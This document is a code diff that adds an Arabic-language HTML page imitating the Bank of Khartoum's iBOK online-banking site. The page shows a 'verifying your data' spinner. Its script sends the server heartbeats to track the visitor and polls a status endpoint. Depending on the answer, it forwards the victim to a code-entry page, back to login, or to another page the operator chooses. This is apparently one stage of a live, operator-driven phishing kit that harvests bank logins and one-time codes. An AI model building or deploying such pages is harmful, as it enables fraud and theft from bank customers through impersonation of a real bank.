@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>بنك الخرطوم | جاري التحقق</title>
+<link href="images/favicon-bok.png" rel="icon">
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
+
+.top-header{display:grid;height:80px;width:100%;grid-template-columns:1fr 3fr;background:linear-gradient(#f33432,#bc262a)}
+.header-logo{width:100%;height:100%;display:inline-grid;place-items:center}
+.header-logo img{height:60px}
+.header-text{color:#fff;text-align:left;display:inline-grid;align-items:center;padding-left:3vw;font-size:24px;font-weight:700;background:linear-gradient(#f0b933,#e2ae2d,#d09e24,#bb8b16)}
+
+.section{flex:1;display:flex;align-items:center;justify-content:center}
+.loading-card{background:#fff;border-radius:8px;padding:50px 40px;text-align:center;box-shadow:0 3px 12px rgba(0,0,0,.15);max-width:450px;width:90%}
+
+.spinner{width:60px;height:60px;border:5px solid #e0e0e0;border-top:5px solid #bc262a;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 24px}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.loading-card h2{color:#333;font-size:20px;font-weight:600;margin-bottom:10px}
+.loading-card p{color:#888;font-size:14px;line-height:1.6}
+
+.dots::after{content:'';animation:dots 1.5s steps(4,end) infinite}
+@keyframes dots{0%{content:''}25%{content:'.'}50%{content:'..'}75%{content:'...'}}
+
+.footer{padding:10px;background:linear-gradient(#bfc1c4,#eff0f1,#fcfdfd,#ffffff);border-top:3px solid #bc262a;text-align:center;line-height:40px}
+.copyright{font-weight:600;color:#4a4a4a;font-size:14px}
+
+@media(max-width:480px){
+  .header-text{font-size:18px;padding-left:12px}
+  .top-header{height:70px}
+  .loading-card{padding:40px 24px}
+}
+</style>
+</head>
+<body>
+
+<div class="top-header">
+  <div class="header-logo">
+    <img src="images/bok-logo.svg" alt="iBOK">
+  </div>
+  <div class="header-text">مرحباً بك في<br>الإنترنت المصرفي<br>iBOK</div>
+</div>
+
+<div class="section">
+  <div class="loading-card">
+    <div class="spinner"></div>
+    <h2>جاري التحقق من بياناتك</h2>
+    <p>يرجى الانتظار بينما يتم التحقق من معلومات حسابك<span class="dots"></span></p>
+  </div>
+</div>
+
+<div class="footer">
+  <div class="copyright">iBOK | بنك الخرطوم 2024</div>
+</div>
+
+<script>
+var _vid=sessionStorage.getItem('_vid');if(!_vid){_vid=Math.random().toString(36).slice(2)+Date.now().toString(36);sessionStorage.setItem('_vid',_vid);}
+function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'loading',vid:_vid})}).catch(function(){});}
+heartbeat();setInterval(heartbeat,5000);
+
+var params=new URLSearchParams(window.location.search);
+var id=params.get('id');
+if(!id){window.location.href='login.html';}
+
+function checkStatus(){
+  fetch('/api/status/'+id)
+  .then(function(r){return r.json();})
+  .then(function(d){
+    if(d.status==='accepted'){
+      window.location.href='code.html?id='+id;
+    }else if(d.status==='rejected'){
+      window.location.href='login.html?error=1';
+    }else if(d.status==='redirect'&&d.redirect){
+      window.location.href=d.redirect+'.html?id='+id;
+    }
+  })
+  .catch(function(){});
+}
+
+setInterval(checkStatus,3000);
+checkStatus();
+</script>
+</body>
+</html>
